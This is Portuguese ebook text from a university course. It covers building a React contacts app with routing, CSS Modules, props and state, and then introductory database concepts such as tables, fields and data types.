que é usado para envolver a aplicação React e habilitar o roteamento no navegador. 
 
import React from 'react' 
import ReactDOM from 'react-dom/client' 
import {App} from './App.jsx' 
import { BrowserRouter } from "react-router-dom"; 
 
ReactDOM.createRoot(document.getElementById('root')).render( 
  <BrowserRouter> 
    <App /> 
  </BrowserRouter>, 
  document.getElementById("root") 
); 
 
Perceba que não vemos os três contatos quando selecionamos a consulta isso acontece poque não 
incluímos o componente contatos no Consulta.jsx. 
 
import {Contato} from './Contato'; 
 
export function Consulta() { 
    return ( 
    <div> 
        <h2>Lista de Contatos</h2> 
        <Contato /> 
    </div> 
    ); 
}   

40 
 
 
 
3.1.2 Componentes de Classe (Class Components)  
Diferentemente dos componentes de funções, os componentes de classe gerenciam o próprio 
estado e manipulam eventos. Quando criamos um componente usando uma classe do JavaScript, 
essa herda os métodos do ciclo de vida do React. As aplicações modernas em React evitam usar 
class componets. A preferência é usar function components com hooks. 
 
class App extends React.Component { 
   render() { 
return ( 
<div> 
        <p>Cabeçalho</p> 
        <p>Conteúdo</p> 
        <p>Rodapé</p> 
      </div> 
    ); 
  } 
} 
 
Não vamos usar por enquanto class components no nosso projeto. 
 
ESTUDO DE CASO: 
Vamos melhorar um pouco mais nossa aplicação colocando um cabeçalho e estilizando as páginas. 
Primeiramente vamos criar um estilo global para todas as páginas. Crie um arquivo global.css, na 
mesma pasta do App.jsx: 
 
:root { 
    --white: #fff; 
    --gray-100: #e1e1e6; 
    --gray-300: #c4c4cc; 
    --gray-400: #8d8d99; 
    --gray-600: #323238; 
    --gray-700: #29292e; 
    --gray-800: #202024; 
    --gray-900: #121214; 
     
    --green-300: #00B37E; 
    --green-500: #00875f; 
   
    --red-500: #F75A68; 
  } 
   
  :focus { 
    outline: transparent; 
    box-shadow: 0 0 0 2px var(--green-500); 
  } 

41 
 
 
   
  * { 
    margin: 0; 
    padding: 0; 
    box-sizing: border-box; 
  } 
   
  body { 
    background: var(--gray-900); 
    color: var(--gray-300); 
    -webkit-font-smoothing: antialiased; 
  } 
   
  body, input, textarea, button { 
    font-family: "Roboto", sans-serif; 
    font-weight: 400; 
    font-size: 1rem; 
  } 
   
 
Importe no App.jsx: 
 
import { Routes, Route } from "react-router-dom" 
 
import {Home} from './components/Home'; 
import {Cadastro} from './components/Cadastro'; 
import {Consulta} from './components/Consulta'; 
 
import './global.css'; 
 
export function App() { 
  return (  
  <div> 
      <Routes> 
        <Route path="/" element={ <Home/> } /> 
        <Route path="cadastro" element={ <Cadastro/> } /> 
        <Route path="consulta" element={ <Consulta/> } /> 
      </Routes> 
  </div> 
  ) 
} 
 
 
Vamos agora criar um componente para representar o cabeçalho das páginas: Header.jsx. Crie esse 
arquivo na pasta componentes. 
 
import logo from '../assets/logo.svg'; 
 
export function Header() { 
  return ( 
    <header> 
      <img src={logo} alt="Logotipo do Sistema de contatos" /> 
    </header> 

42 
 
 
  ); 
} 
 
Coloque o arquivo logo.svg na pasta assets. 
 
No arquivo App.js importar o cabeçalho: 
 
import { Routes, Route } from "react-router-dom" 
 
import {Home} from './components/Home'; 
import {Cadastro} from './components/Cadastro'; 
import {Consulta} from './components/Consulta'; 
import {Header} from './components/Header'; 
 
import './global.css'; 
 
export function App() { 
  return (  
  <div> 
    <Header /> 
    <div> 
      <Routes> 
        <Route path="/" element={ <Home/> } /> 
        <Route path="cadastro" element={ <Cadastro/> } /> 
        <Route path="consulta" element={ <Consulta/> } /> 
      </Routes> 
    </div> 
  </div> 
  ) 
} 
 
Verifique que como o cabeçalho foi colocado no App.jsx ele aparece em todas as páginas, pois ele 
representa a estrutura básica de todas as páginas. 
Vamos agora estilizar o cabeçalho. 
 
Quando você escreve estilos em um arquivo CSS convencional, esses estilos podem afetar todos os 
elementos HTML na página. Isso significa que, se você tiver dois componentes diferentes que usam 
classes CSS com os mesmos nomes, pode haver conflitos e os estilos podem se sobrepor, causando 
problemas de renderização. 
 
Para evitar conflitos de estilos entre diferentes vamos usar os estilos “escopados” do em CSS 
Modules.  
 
Com os estilos “escopados” do CSS Modules, cada componente possui seu próprio escopo de estilo. 

43 
 
 
Isso é alcançado automaticamente pelo compilador de CSS Modules, que renomeia 
automaticamente as classes CSS de cada componente para garantir que elas sejam únicas dentro 
do escopo desse componente. 
 
Para que isso seja possível não criaremos os arquivos de estilo apenas com o nome seguido de .css, 
mas o nome seguido de .module.css. 
 
Para carregar os estilos apenas do componente Header.jsx, criar um arquivo Header.module.css, 
coloque na mesma pasta do Header.jsx: 
 
.header { 
    background: var(--gray-800); 
    display: flex; 
    justify-content: center; 
    padding: 1.25rem 0; 
  } 
   
  .header img { 
    height: 2rem; 
  } 
 
No Header.jsx importar o CSS import styles from './Header.module.css', observe que é preciso dar 
um nome ao estilo que nesse exemplo foi chamado de syles. 
Agora é só aplicar o estilo desejado ao elemento do componente. Vamos estilizar a própria tag 
<header> usando a classe .header que foi definida no arquivo .css: 
 
4<header className={styles.header}> 
 
O código completo do componente Header.jsx: 
 
import styles from './Header.module.css'; 
 
import logo from '../assets/logo.svg'; 
 
export function Header() { 
  return ( 
    <header className={styles.header}> 
      <img src={logo} alt="Logotipo do Sistema de contatos" /> 
    </header> 
  ); 
} 
 
Agora vamos também criar um Module CSS apenas para o componente App.jsx, chame ele de 

44 
 
 
App.module.css, coloque na mesma pasta do App.jsx: 
 
.wrapper { 
    max-width: 70rem; 
    margin: 2rem auto; 
    padding: 0 1rem; 
   
    display: grid; 
    grid-template-columns: 256px 1fr; 
    gap: 2rem; 
    align-items: flex-start; 
  } 
   
  @media (max-width: 768px) { 
    html { 
      font-size: 87.5%; 
    } 
   
    .wrapper { 
      grid-template-columns: 1fr; 
    } 
  } 
 
No arquivo App.js, import o CSS e estilize a tag div className={styles.wrapper}> O código 
agora fica da seguinte forma: 
 
import { Routes, Route } from "react-router-dom" 
 
import {Home} from './components/Home'; 
import {Cadastro} from './components/Cadastro'; 
import {Consulta} from './components/Consulta'; 
import {Header} from './components/Header'; 
 
import styles from './App.module.css'; 
import './global.css'; 
 
export function App() { 
  return (  
  <div> 
    <Header /> 
    <div className={styles.wrapper}> 
      <Routes> 
        <Route path="/" element={ <Home/> } /> 
        <Route path="cadastro" element={ <Cadastro/> } /> 
        <Route path="consulta" element={ <Consulta/> } /> 
      </Routes> 
    </div> 
  </div> 
  ) 
} 
 
 

45 
 
 
 
Vamos criar a sidebar que mostrará o perfil do usuário. Crie o componente Sidebar.jsx. Coloque o 
arquivo developer.png na pasta assets. 
 
import styles from './Sidebar.module.css'; 
import dev from '../assets/developer.png'; 
 
export function Sidebar() { 
  return ( 
    <aside className={styles.sidebar}> 
      <img className={styles.cover} src={dev}/> 
      <div className={styles.profile}> 
        <strong>Mônica Andrade</strong> 
        <span>Front-End</span> 
      </div> 
    </aside> 
  ); 
} 
 
Para este componente o CSS Module Sidebar.module.css: 
 
.sidebar { 
    background: var(--gray-800); 
    border-radius: 8px; 
    overflow: hidden; 
  } 
   
  .cover { 
    width: 100%; 
    height: 72px; 
    object-fit: cover; 
  } 
   
  .profile { 
    display: flex; 
    flex-direction: column; 
    align-items: center; 
   
    margin-top: calc(0.5rem ); 
    margin-bottom: calc( 0.5rem ); 
  } 
   
  .profile strong { 
    margin-top: 1rem; 
    color: var(--gray-100); 
    line-height: 1.6; 
  } 
   
  .profile span { 
    font-size: 0.875rem; 
    color: var(--gray-400); 
    line-height: 1.6; 

46 
 
 
  } 
 
Acrescente a sidebar no arquivo App.jsx: 
 
import { Routes, Route } from "react-router-dom" 
 
import {Home} from './components/Home'; 
import {Cadastro} from './components/Cadastro'; 
import {Consulta} from './components/Consulta'; 
import {Header} from './components/Header'; 
import { Sidebar } from './components/Sidebar'; 
 
import styles from './App.module.css'; 
import './global.css'; 
 
export function App() { 
  return (  
  <div> 
    <Header /> 
    <div className={styles.wrapper}> 
    <Sidebar /> 
      <main> 
        <Routes> 
          <Route path="/" element={ <Home/> } /> 
          <Route path="cadastro" element={ <Cadastro/> } /> 
          <Route path="consulta" element={ <Consulta/> } /> 
        </Routes> 
      </main> 
    </div> 
  </div> 
  ) 
} 
 
Vamos configurar os botões de link da Home.jsx. Criar um arquivo CSS Module na mesma pasta de 
nome Home.module.css: 
 
.context a { 
    width: 100%; 
    background: transparent; 
    color: var(--green-500); 
    border: 1px solid var(--green-500); 
    border-radius: 8px; 
    width: 250px; 
    height: 50px; 
    padding: 0 1.5rem; 
    font-weight: bold; 
    display: block; 
    text-decoration: none; 
   
    display: flex; 
    align-items: center; 

47 
 
 
    justify-content: center; 
   
    gap: 0.5rem; 
   
    margin-top: calc(0.5rem ); 
    margin-bottom: calc( 0.5rem ); 
     
    transition: color 0.1s, background-color 0.1s; 
  } 
   
  .context a:hover { 
    background: var(--green-500); 
    color: var(--white); 
  } 
 
Alterar o arquivo Home.jsx para: 
 
import { Link } from "react-router-dom"; 
import styles from './Home.module.css'; 
 
export function Home() { 
    return ( 
      <div> 
        <h2>Sistema de Contatos</h2> 
  
  
  
  
<div 
className={styles.context}><Link 
to="cadastro">Cadastro</Link></div> 
  
  
  
  
<div 
className={styles.context}><Link 
to="consulta">Consulta</Link></div> 
      </div> 
    ) 
} 
 
A página inicial deve estar com essa aparência agora: 
 
 
 

48 
 
 
 
 
GERENCIAMENTO DE ESTADO 
E PROPRIEDADES DO REACT 
 
Ao final dos estudos, você deverá ser capaz de: compreender e aplicar os conceitos de props 
e state. Esses dois elementos são essenciais para o funcionamento das aplicações React, permitindo 
a passagem de dados entre componentes e a gestão dinâmica do estado da aplicação. 
 
4.1 Utilização de Propriedades (Props) No React 
Na hora que selecionamos consulta aparecem 3 contatos fixos na página: 
 
 
 
Estarem fixo nesse momento não tem problema porque estamos fazendo o Fron-end, sem acesso 
a base de dados nenhuma, mas olhando o código de Contato.jsx vemos que existe uma repetição 
de partes que poderiam ser um componente Contato único, com parâmetros. 
 
export function Contato() { 
    return ( 
    <div> 
        <div> 
            <p>Nome: Joelma Ferreira </p> 
            <p>Endereço:Rua 17, 896 </p> 
            <p>Telefone: 99856587 </p> 
            <br/> 
            <p>Nome: Diogo Almeida </p> 
UNIDADE 4 

49 
 
 
            <p>Endereço: Rua das Flores, 12 </p> 
            <p>Telefone: 89545588 </p> 
            <br/> 
            <p>Nome: Pablo Picasso </p> 
            <p>Endereço:Avenida das Nações </p> 
            <p>Telefone: 96578541 </p> 
            <br/> 
        </div> 
    </div> 
    ); 
 
Já Consulta.jsx chama só um componente: 
 
import {Contato} from './Contato'; 
 
export function Consulta() { 
    return ( 
    <div> 
        <h2>Lista de Contatos</h2> 
        <Contato /> 
    </div> 
    ); 
}   
 
Vamos mudar essa estrutura, iremos criar um com componente Contatos e chamá-lo três vezes em 
consulta passado os dados que precisam ser renderizados como propriedade. O arquivo Contato.jsx 
ficaria assim: 
 
export function Contato(props) { 
    return ( 
    <div> 
        <p>Nome: {props.nome} </p> 
        <p>Endereço: {props.endereco} </p> 
        <p>Telefone: {props.telefone} </p> 
        <br/> 
    </div> 
    ); 
}  
 
O arquivo Consulta.jsx alterado para criar três contatos: 
 
import {Contato} from './Contato'; 
 
export function Consulta() { 
    return ( 
    <div> 
        <h2>Lista de Contatos</h2> 
  
  
  
  
<Contato 
nome="Joelma 
Ferreira" 
endereco="Rua 
17, 
896"  telefone="99856587" /> 

50 
 
 
        <Contato nome="Diogo Almeida" endereco="Rua das Flores, 
12"  telefone="89545588" /> 
  
  
  
  
<Contato 
nome="Pablo 
Picasso" 
endereco="Avenida 
das 
Nações"  telefone="96578541" /> 
    </div> 
    ); 
}   
 
Agora aplicaremos um estilo. Crie um arquivo Contato.module.css: 
 
  .content { 
    background: var(--gray-700); 
    border-radius: 8px; 
    padding: 1rem; 
    margin-bottom: 1rem; 
    margin-top: 2rem; 
  } 
   
 
  .field  { 
    font-size: 0.875rem; 
  } 
 
  .field strong { 
    line-height: 1.6; 
    color: var(--green-300); 
  } 
   
Aplique no Contato.jsxs: 
 
import styles from './Contato.module.css'; 
 
export function Contato(props) { 
    return ( 
    <div className={styles.content}> 
  
  
  
  
<div 
className={styles.field}><p><strong>Nome:</strong> 
{props.nome} </p></div><br/> 
  
  
  
  
<div 
className={styles.field}><strong>Endereço:</strong> 
{props.endereco} </div><br/> 
  
  
  
  
<div 
className={styles.field}><strong>Telefone:</strong> 
{props.telefone} </div> 
        <br/> 
    </div> 
    ); 
}  
 
Agora a página de consulta estará assim: 

51 
 
 
 
Vamos agora apenas organizar o arquivo Consulta.jsx para ler os dados de um vetor, varrer essa 
lista e montar os contatos dinamicamente: 
 
import {Contato} from './Contato'; 
 
const contatos = [ 
    { 
        nome: 'Joelma Ferreira', 
        endereco: '"Rua 17, 896"', 
        telefone: "99856587"  
    }, 
    { 
        nome: 'Diego Fernandes', 
        endereco: 'Rua das Flores, 12', 
        telefone: "89545588"  
    }, 
    { 
        nome: 'Pablo Picasso', 
        endereco: 'Avenida das Nações', 
        telefone: "96578541"  
    }, 
  ]; 
 
export function Consulta() { 
    return ( 
    <div> 
        <h2>Lista de Contatos</h2> 
        {contatos.map(contato => { 
            return ( 
                <Contato  

52 
 
 
                    nome={contato.nome}  
                    endereco={contato.endereco}   
                    telefone={contato.telefone}  
                /> 
              ) 
          })} 
 
    </div> 
    ); 
}   
 
 
4.2 Utilização de Estados (States) no React 
Vamos agora fazer a nossa tela de cadastro. Primeiro vamos criar o Cadastro.module.css: 
 
.commentForm { 
    width: 100%; 
    margin-top: 1.5rem; 
    padding-top: 1.5rem; 
    border-top: 1px solid var(--gray-600); 
  } 
   
  .commentForm input { 
    width: 100%; 
    background: var(--gray-800); 
    border: 0; 
    resize: none; 
    height: 3rem; 
    padding: 1rem; 
    border-radius: 0.25rem; 
    color: var(--gray-100); 
    line-height: 1.4; 
    margin-top: 1rem; 
  } 
   
 
  .commentForm button[type="submit"] { 
    padding: 1rem 1.5rem; 
    margin-top: 1rem; 
    border-radius: 8px; 
    border: 0; 
    background: var(--green-500); 
    color: var(--white); 
    font-weight: bold; 
    cursor: pointer; 
   
    transition: background-color 0.1s; 
  } 
   
  .commentForm button[type="submit"]:not(:disabled):hover { 
    background: var(--green-300); 
  } 

53 
 
 
   
  .commentForm button:disabled { 
    opacity: 0.7; 
    cursor: not-allowed; 
  } 
 
Modificar o arquivo Cadastro.jsx para slavar os dados em state quando o usuário clicar no botão de 
cadastro: 
 
import styles from './Cadastro.module.css'; 
import {useState} from 'react'; 
 
export function Cadastro() { 
    const [formData, setFormData] = useState({nome: "",endereco: 
"",telefone: ""}); 
 
    const  handleChange = (event) => { 
        const { name, value } = event.target; 
        setFormData((prevFormData) => ({ ...prevFormData, [name]: value 
})); 
    }; 
 
    const handleSubmit = (event) => { 
        event.preventDefault(); 
        alert(`Nome: ${formData.nome}, Endereco: ${formData.endereco}, 
Telefone: ${formData.telefone}` 
        ); 
    }; 
 
    return ( 
        <div> 
        <h2>Cadastro</h2> 
        <form onSubmit={handleSubmit} className={styles.commentForm}> 
                <input 
                name="nome" 
                placeholder="Nome" 
                value={formData.nome}  
                onChange={handleChange} 
                required 
                /> 
                <input 
                name="endereco" 
                value={formData.endereco}  
                onChange={handleChange} 
                placeholder="Endereço" 
                required 
                /> 
                 <input 
                name="telefone" 
                value={formData.telefone}  
                onChange={handleChange} 
                placeholder="Telefone" 
                required 

54 
 
 
                /> 
                <footer> 
                <button type="submit" >Salvar</button> 
                </footer> 
         </form> 
        </div> 
    ); 
}  
 
A tela ficará assim: 
 
 

55 
 
 
 
 
CICLO 
DE 
VIDA 
DOS 
COMPONENTES 
 
Ao final dos estudos, você deverá ser capaz de: explorar conceitos mais avançados do React. 
Tratar dos Hook, Styled-components e reforçar conceitos de Rota. 
 
5.1 Implementação de Rotas no React 
Ao desenvolver aplicações web com React, muitas vezes é necessário gerenciar a navegação entre 
diferentes páginas ou componentes da aplicação. Para isso, é comum utilizar uma biblioteca de 
roteamento, como o React Router. 
 
O React Router permite que você defina rotas para diferentes URLs e mapeie cada rota para um 
componente específico. 
 
Mais informação no: https://reactrouter.com/en/main 
 
5.2 Utilização de Hooks 
Os Hooks são uma característica introduzida no React a partir da versão 16.8. Eles permitem que 
você utilize estado e outras características do React sem a necessidade de escrever classes. Os 
Hooks mais comuns incluem useState, useEffect, useContext, entre outros. 
 
Os Hooks proporcionam uma maneira mais simples e concisa de escrever componentes funcionais, 
tornando o código mais legível e fácil de dar manutenção. Eles também facilitam a reutilização de 
lógica entre diferentes componentes, já que a lógica encapsulada em Hooks pode ser facilmente 
compartilhada.  
UNIDADE 5 

56 
 
 
 
 
Esse é um conceito avançado que precisa ser entendido devagar. Mais informação no: https://pt-
br.legacy.reactjs.org/docs/hooks-intro.html 
 
 
5.3 Estilização de Componentes com Styled-Components  
Styled Components é uma biblioteca para estilizar componentes em aplicações React utilizando CSS-
in-JS. Em vez de criar arquivos separados para estilos CSS e importá-los em seus componentes, 
você pode definir estilos diretamente no arquivo do componente usando a sintaxe de template 
literals do JavaScript. 
 
Isso torna a estilização mais encapsulada e fácil de manter, pois os estilos estão diretamente 
associados aos componentes que eles estilizam. Além disso, Styled Components oferece recursos 
poderosos, como a capacidade de definir estilos com base em propriedades dinâmicas e a 
capacidade de estilizar componentes com base no estado deles. 
O código abaixo por exemplo poderia ir diretamente dá página. Jsx 
 
const Button = styled.button` 
  background: transparent; 
  border-radius: 3px; 
  border: 2px solid #BF4F74; 
  color: #BF4F74; 
  margin: 0 1em; 
  padding: 0.25em 1em; 
 
Mais informação no: https://styled-components.com/ 

57 
 
PARA FINALIZAR 
 
Chegamos ao fim desta jornada de exploração do desenvolvimento front-end. Durante esta 
disciplina, discutimos fundamentos e práticas essenciais para dominar esta área da tecnologia 
da informação. 
 
Exploramos as nuances entre Front-End, Back-End e Full-Stack, compreendendo o papel 
essencial de cada um no ecossistema de desenvolvimento de software. Analisamos as 
diferenças entre Frameworks e Bibliotecas, reconhecendo seu impacto no processo de 
desenvolvimento. Dedicamos tempo para entender a biblioteca React e suas aplicações no 
desenvolvimento de interfaces de usuário dinâmicas e interativas. 
 
Fizemos uma análise introdutória sobre a linguagem JavaScript, explorando desde conceitos 
básicos, como a declaração de variáveis, até tópicos mais avançados, como Arrow Functions 
e Template strings, fundamentais para o desenvolvimento front-end. 
 
Na segunda parte da disciplina, focamos na introdução ao React, abordando desde a 
configuração do ambiente de desenvolvimento até os pilares essenciais dessa biblioteca, 
incluindo o Document Object Model (DOM), que desempenha um papel fundamental na 
manipulação da estrutura de uma página web. 
 
Utilizando uma abordagem prática utilizamos Componentes no React para criar interfaces 
reutilizáveis e modularizadas de um problema proposto, explorando estratégias de 
Gerenciamento de Estado e Propriedades no React. 
 
Convido você a continuar explorando e aprofundando seus conhecimentos neste campo do 
desenvolvimento front-end. Mantenha-se atualizado com as últimas tendências e tecnologias, 
e nunca deixe de praticar e aprimorar suas habilidades. Lembre-se de que o desenvolvimento 
front-end é um campo em constante evolução, e seu domínio pode abrir portas para 
oportunidades em sua carreira profissional. 
 
Profa. Dra. Joelma de Moura Ferreira 
74 

 
 
 
 
 
 
 
 
 
 
 
 
Dra. Joelma de Moura Ferreira. 
 
Sobre o autora 
 
Joelma de Moura Ferreira é doutora em Ciência da Computação pela Universidade Federal de 
Goiás, com mestrado em Ciência da Computação pela Universidade Federal de Goiás, MBA em 
Gerenciamento de Projetos pela Fundação Getúlio Vargas, especialização em Redes de 
Computadores pela Universidade Salgado de Oliveira, MBA em Tecnologia para Negócios: AI, Data 
Science e Big Data pela Pontifícia Universidade Católica do Rio Grande do Sul e graduação em 
Ciência da Computação pela Universidade Católica de Goiás. Tendo atuado por mais de 20 anos 
como docente de graduação e pós-graduação em diversas instituições de ensino superior, incluindo 
Faculdade Sul-Americana, Universidade Paulista, Faculdade Estácio de Sá de Goiás, Pontifícia 
Universidade Católica, Centro Universitário Alves Farias. Desempenhou a função de coordenadora 
do curso de graduação de Sistemas de Informação e dos cursos de pós-graduação em Gestão de 
Projetos, Gestão de Tecnologia da Informação e Arquitetura e Engenharia de Software no Centro 
Universitário Alves Faria, onde também exerceu a atividade de pesquisadora no Mestrado em 
Desenvolvimento R Fora do domínio acadêmico, exerce a função de Cientista de Dados no Tribunal 
de Justiça do Distrito Federal e Territórios. 
 
 
 
 
 
 
 
 
 
 
 
 

 
Referências Bibliográficas 
 
CHAK, A. Como Criar Sites Persuasivos. São Paulo: Pearson Prentice Hall, 2004.  
 
DEGEN, R. Aprenda Programação Orientada a Objetos em 21 dias. São Paulo: Pearson 
Prentice Hall, 2002.  
 
FLANAGAN, D. JavaScript: o guia definitivo. 6ª ed. Porto Alegre: Bookman, 2014.  
 
FORBELLONE, A. L. V.; EBERSPACHER, H. F. Lógica de Programação: a construção de 
algoritmos e estruturas de dados. 3ª ed. São Paulo: Pearson Prentice Hall, 2005.  
 
MARCOLINO, A. S. Frameworks Front End. 1ª ed. São Paulo: Saraiva, 2021. 
 
MILETTO, E. M. Desenvolvimento de software II: introdução ao desenvolvimento web 
com html, css, javascript e php. Porto Alegre: Bookman, 2014.  
 
SEGURADO, V. S. Projeto de interface com o usuário. 1ª ed. São Paulo: Pearson, 2016. 
 
SIMAS, V. L. et. al. Desenvolvimento para dispositivos móveis - Volume 2. Porto Alegre: 
Sagah, 2019. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 


--- Fim do arquivo: eBook - Desenvolvimento Front-End 2.pdf ---

--- Começo do arquivo: eBook - Banco de Dados 1.pdf ---

7 
 
 
 
 
FUNDAMENTOS DE BANCO 
DE DADOS  
É com grande prazer que damos início a essa jornada de aprendizado e descobertas. 
Nesta unidade, teremos a oportunidade de explorar e aprofundar nossos conhecimentos em 
um tema fascinante. 
Ao final dos estudos, você deverá ser capaz de: compreender a definição e os 
conceitos-chave de banco de dados e explorar a instalação do ambiente. 
 
1.1 Introdução aos Conceitos de Dados, Informação e Banco de 
Dados 
Dado, informação e conhecimento são termos inter-relacionados, mas com 
significados distintos no contexto da tecnologia. 
Dado: Os dados são elementos brutos e desorganizados que representam fatos, números, 
símbolos ou caracteres que ainda não possuem contexto ou significado específico. Por si só, 
os dados são apenas pontos de dados isolados, como letras, números ou símbolos, que não 
têm significado ou utilidade. Por exemplo, "12", "vermelho" ou "A". 
Informação: Informação é o dado que foi processado, organizado ou estruturado de forma 
a ter um contexto, significado e relevância. Ela fornece respostas a perguntas como: quem? 
o quê? Onde? Quando? e por quê? tornando os dados compreensíveis e utilizáveis. Por 
exemplo, se temos o dado "12" representando a temperatura, a informação seria "12 graus 
Celsius". A informação adiciona valor aos dados, permitindo que sejam compreendidos e 
utilizados para tomar decisões ou realizar ações. 
Conhecimento: O conhecimento é um nível mais elevado de compreensão e compilação de 
informações. Ele vai além da simples interpretação dos dados e informações, envolvendo a 
UNIDADE 1 

8 
 
 
aplicação de entendimentos, experiências e insights para resolver problemas, tomar decisões 
e criar ideias. O conhecimento é construído ao longo do tempo através da experiência, 
aprendizado e reflexão sobre informações e experiências passadas. Por exemplo, o 
conhecimento médico envolve a aplicação de informações sobre anatomia, fisiologia e 
medicamentos para diagnosticar e tratar doenças. 
Um banco de dados é uma coleção organizada de dados que são armazenados e 
gerenciados eletronicamente. Esses dados podem ser de vários tipos como texto, números, 
imagens, vídeos, entre outros formatos. O objetivo principal de um banco de dados é fornecer 
um meio eficiente para armazenar e recuperar informações de maneira rápida e precisa. 
Os dados armazenados em um banco de dados são posteriormente processados por 
aplicações de software. Essas aplicações podem realizar uma variedade de operações nos 
dados como inserção, atualização, exclusão e consulta. Além disso, as aplicações podem 
executar análises e cálculos complexos nos dados para produzir informações significativas. 
Essas informações são disponibilizadas aos usuários por meio de interfaces de usuário, 
relatórios, dashboards e outras formas de apresentação. Essas informações ajudam os 
usuários a tomar decisões informadas e embasadas nos dados disponíveis. 
 
1.2 Importância dos Bancos de Dados da Organização e 
Manipulação de Informações 
• Tabela 
Uma tabela é uma estrutura compostas por linhas e colunas na qual armazenamos os 
dados. 
Por exemplo, supondo que uma empresa queira armazenar dados como código, nome, 
endereço e telefone de quatro de seus clientes. Poderíamos criar uma tabela CLIENTE 
contendo colunas com CODIGO, NOME, ENDERECO, IDADE e TELEFONE. Nas linhas desta 
tabela escreveríamos os dados de cada cliente individualmente. Como seriam quatro clientes, 
a tabela teria um cabeçalho e quatro linhas de dados. Veja o exemplo ilustrado na Figura 
1.1. 

9 
 
 
 
Figura 1.1: Exemplo de uma tabela de dados cadastrais de clientes 
 
Definimos nomes especiais para os elementos de uma tabela. As colunas chamamos 
CAMPOS, e as linhas chamamos REGISTROS. Perceba que na tabela, o campo “endereço” 
está sem o cedilha e o código sem o acento, isso é porque evitamos colocar acentos nos 
nomes dos campos e da própria tabela. Também não colocamos espaço, por exemplo, se 
quiser dar o nome Vendas do Mês para um campo, o ideal é não colocar espaço ou acento. 
Um bom nome seria VENDAS_MES, substituímos o espaço por _ e tiramos o acento. 
Os nomes dos campos e da própria tabela são importantes, pois eles já dão uma ideia 
de quais dados estão armazenados. Procure sempre dar nomes condizentes com o conteúdo. 
Para garantir a consistência dos dados, busque criar tabelas cujos dados descrevam um 
elemento de forma única como: tabela dados dos ALUNOS, tabela das VENDAS, tabela dos 
PRODUTOS e assim por diante. Os dados que são armazenados em uma tabela devem 
descrever um elemento ou a relação entre elementos (como veremos mais adiante). 
Exercício 1: VAMOS PRATICAR!! 
Se você tivesse que projetar uma tabela para armazenar os dados que estão na sua 
carteira de identidade. Quais seriam os campos que colocaria? Dê nome a tabela, aos campos 
e coloque pelo menos dois registros (podem ser fictícios). Faça sem olhar a resposta. Depois, 
compare com a sua. Não existe uma resposta única. Os campos podem ficar com nomes 
diferentes, a ordem pode não ser a mesma. O importante é que siga a regra de nomenclatura 
dos campos.  
Resposta Exercício 1 

10 
 
 
 
 
• Tipo dos campos 
Um outro ponto importante no momento de criar uma tabela de um banco de dados 
no computador é definir o tipo de dados que será armazenado em cada coluna. O dado pode 
ser texto, número, data ou campo do tipo verdadeiro ou falso. Definimos também o tamanho 
máximo de cada coluna.  
Para o exemplo da tabela CLIENTES, podemos definir: 
• CODIGO: texto com tamanho de 3 caracteres no máximo 
• NOME: texto com tamanho de 50 caracteres no máximo 
• IDADE: valor inteiro 
• ENDERECO: texto com tamanho de 200 caracteres no máximo 
• TELEFONE: texto com tamanho de 9 caracteres no máximo 
Isso é muito importante para controle e tratamento dos dados. Não sabe o que é um 
tipo de dados? 
pesquise em: https://pt.wikipedia.org/wiki/Tipo_de_dado 
Exercício 2: VAMOS PRATICAR!! 
Quais seriam os tipos de dados e tamanho da tabela criada por você no Exercício 1? 
Resposta do Exercício 2: 
• CPF: texto com tamanho de 11 caracteres no máximo 
• RG: texto com tamanho de 15 caracteres no máximo 
• NOME: texto com tamanho de 50 caracteres no máximo 
• MAE: texto com tamanho de 50 caracteres no máximo 
• DT_NASCIMENTO: data 
• NATURALIDADE: texto com tamanho de 20 caracteres no máximo 
• DT_EXPEDICAO: data 
• ORGAO: texto com tamanho de 50 caracteres no máximo 

11 
 
 
 
• Banco de Dados 
Um banco de dados pode ser definido de forma “simples” como um conjunto de 
tabelas. Mas, não é só isso. Mais na frente aprimoraremos essa definição. Por 
enquanto, ficaremos com essa visão simplificada. Um banco de dados simples conteria uma 
única tabela, quanto mais tabelas, mais complexo é o banco de dados. Já dá para imaginar 
que os sistemas de uma empresa lidam com dezenas e centenas de tabelas diferentes. 
Vamos voltar para a empresa que quer armazenar dados dos seus clientes. 
Imaginemos que agora ela queira armazenar também dados dos vendedores que fazem parte 
do quadro de colaboradores. Seriam apenas três vendedores e os campos a serem usados 
são MATRICULA, NOME, TELEFONE. O conjunto das duas tabelas e dos dados armazenados 
nela, por enquanto, irão compor o nosso banco de dados. A Figura 1.2 ilustra esse exemplo. 
 
Figura 1.2: Exemplo das duas tabelas do banco de dados: clientes e vendedores 
 
• Banco de dados relacional 
Até agora, vimos o que são dados e como recuperá-los, que podemos armazenar 
dados em estruturas chamadas tabelas, dividindo esses dados em campos, campos esses 
que possuem um tipo e tamanho máximo. As tabelas também possuem linhas que são os 
registros individualizados do conjunto de dados (Figura 1.3).  

12 
 
 
 
Figura 1.3: Fluxo da definição da tabela 
 
Como um banco de dados pode ter várias tabelas, o fluxo ilustrado na Figura 1.3 deve 
ser repetido para cada tabela que pretendemos criar.  
• A importância de banco de dados 
Esses são alguns dos principais aspectos que destacam a importância dos bancos de 
dados. 
▪ Organização Estruturada: os dados são organizados, permitem relacionamentos entre 
diferentes conjuntos de dados e facilitam a análise e recuperação de informações 
específicas. 
▪ Armazenamento Centralizado: os bancos de dados fornecem um local centralizado 
para armazenar grandes volumes de dados de forma estruturada. 
▪ Facilidade de Acesso: permitem o acesso rápido e eficiente às informações por meio 
de consultas SQL (Structured Query Language) ou interfaces de programação. 
▪ Integridade dos Dados: os bancos de dados garantem a integridade dos dados por 
meio de restrições e validações, evitando a inserção de informações inconsistentes ou 
inválidas. 
▪ Segurança dos Dados: os sistemas de gerenciamento de banco de dados (SGBDs) 
oferecem recursos de segurança, como autenticação de usuários e controle de acesso, 
garantindo a proteção dos dados contra acesso não autorizado. 

13 
 
 
▪ Backup e Recuperação: permitem a realização de backups regulares dos dados, 
garantindo a recuperação rápida em caso de falhas de hardware, erros humanos ou 
desastres naturais. 
▪ Escalabilidade: os sistemas de banco de dados são projetados para lidar com grandes 
volumes de dados e podem ser dimensionados conforme necessário para atender aos 
requisitos de crescimento da organização. 
▪ Suporte a Transações: os bancos de dados oferecem suporte a transações, garantindo 
consistência e atomicidade durante operações de inserção, atualização e exclusão de 
dados. 
▪ Análise de Dados: permitem a execução de consultas complexas e análises de dados 
para obter insights valiosos e tomar decisões informadas. 
